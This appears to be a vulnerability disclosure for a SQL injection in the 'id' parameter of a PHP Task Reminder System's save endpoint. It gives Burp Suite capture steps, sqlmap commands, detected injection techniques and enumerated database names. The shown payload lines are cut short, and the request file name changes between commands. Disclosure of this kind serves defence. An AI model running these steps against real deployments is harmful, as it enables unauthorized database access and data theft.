---
slug: tast-reminder-system-save
title: Task Reminder System (save)
---



## Details

### Related Code file: 
`/php-trs/classes/Users.php?f=save`

## Injection parameter: 
`MULTIPART id`


&nbsp;


## POC

![1](https://github.com/user-attachments/assets/a20953b8-f8b4-4afb-86f3-b55f94556e9e)

Intercept the request using Burpsuite Proxy.

![2](https://github.com/user-attachments/assets/d47fd3d4-e6f7-446d-8b0d-183677b42446)

Save the request to `save.txt`.


### Verify vulnerability

```
sqlmap -r save.txt --batch
```

![53](https://github.com/user-attachments/assets/0221b0a2-6ec8-404f-a0f8-bf920a42c204)

![54](https://github.com/user-attachments/assets/d9858391-9f8f-4baf-a105-a50a3e3b943a)

```
Parameter: MULTIPART id ((custom) POST)
    Type: error-based
    Title: MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)
    Payload: -----------------------------358921456726172311441958711310
Content-Disposition: form-data; name="id"


    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
    Payload: -----------------------------358921456726172311441958711310
Content-Disposition: form-data; name="id"
```


### Dump databases

```
sqlmap -r save_reminder.txt --batch --dbs
```

![55](https://github.com/user-attachments/assets/d2ef0958-79d8-465a-b117-0fdc252d622c)

```
[04:19:54] [INFO] fetching database names
[04:19:54] [INFO] retrieved: 'information_schema'
[04:19:54] [INFO] retrieved: 'trs'
available databases [2]:
[*] information_schema
[*] trs
```
